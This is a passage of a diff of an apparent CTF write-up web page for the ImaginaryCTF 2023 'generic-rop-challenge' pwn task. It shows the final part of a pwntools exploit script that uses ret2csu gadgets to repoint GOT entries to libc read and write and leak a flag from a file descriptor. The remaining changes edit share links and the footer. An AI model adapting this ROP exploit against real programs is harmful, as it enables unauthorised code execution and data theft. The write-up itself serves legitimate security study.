+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;below</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gets(bss) // stdin: libc.symbols[&#34;read&#34;]</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_fptr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x600</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;setup read function pointer @ bss + 0x600&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="p">(</span><span class="n">read_fptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;gets&#34;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;below</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># read(5, flag_addr, 0x100)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x700</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;read(5, flag_addr, 0x100)&#34;</span><span class="p">)</span>  <span class="c1"># trial-and-error to find the proper fd</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">flag_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">read_fptr</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;below</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gets(bss) // stdin: libc.symbols[&#34;write&#34;]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_fptr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x600</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;setup write function pointer @ bss + 0x600&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="p">(</span><span class="n">write_fptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;gets&#34;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;below</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;write&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># write(1, flag_addr, 0x100)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">flag_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">write_fptr</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;below</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
         </div>
                 
         
@@ -913,7 +1093,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;title=[imaginary-ctf-2023]%20[pwn]%20generic-rop-challenge"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;title=generic-rop-challenge"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -932,7 +1112,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;text=[imaginary-ctf-2023]%20[pwn]%20generic-rop-challenge"
+      href="https://twitter.com/intent/tweet/?url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;text=generic-rop-challenge"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -951,7 +1131,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;resubmit=true&amp;title=[imaginary-ctf-2023]%20[pwn]%20generic-rop-challenge"
+      href="https://reddit.com/submit/?url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;resubmit=true&amp;title=generic-rop-challenge"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -970,7 +1150,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;description=[imaginary-ctf-2023]%20[pwn]%20generic-rop-challenge"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;description=generic-rop-challenge"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -989,7 +1169,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;quote=[imaginary-ctf-2023]%20[pwn]%20generic-rop-challenge"
+      href="https://www.facebook.com/sharer/sharer.php?u=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;quote=generic-rop-challenge"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1008,7 +1188,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;subject=[imaginary-ctf-2023]%20[pwn]%20generic-rop-challenge"
+      href="mailto:?body=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;subject=generic-rop-challenge"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1027,7 +1207,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://api.whatsapp.com/send?text=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;resubmit=true&amp;title=[imaginary-ctf-2023]%20[pwn]%20generic-rop-challenge"
+      href="https://api.whatsapp.com/send?text=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;resubmit=true&amp;title=generic-rop-challenge"
       title=""
       aria-label=""
       >
@@ -1046,7 +1226,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://t.me/share/url?url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;resubmit=true&amp;title=[imaginary-ctf-2023]%20[pwn]%20generic-rop-challenge"
+      href="https://t.me/share/url?url=https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/&amp;resubmit=true&amp;title=generic-rop-challenge"
       title=""
       aria-label=""
       >
@@ -1099,6 +1279,8 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
     </main><footer id="site-footer" class="py-10 print:hidden">
   
   
+    
+  
   <div class="flex items-center justify-between">
 
     
@@ -1106,7 +1288,7 @@ in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead du
     <p class="text-sm text-neutral-500 dark:text-neutral-400">
       &copy;
       2023
-      William Wijaya
+      d0UBleW
     </p>
     
 
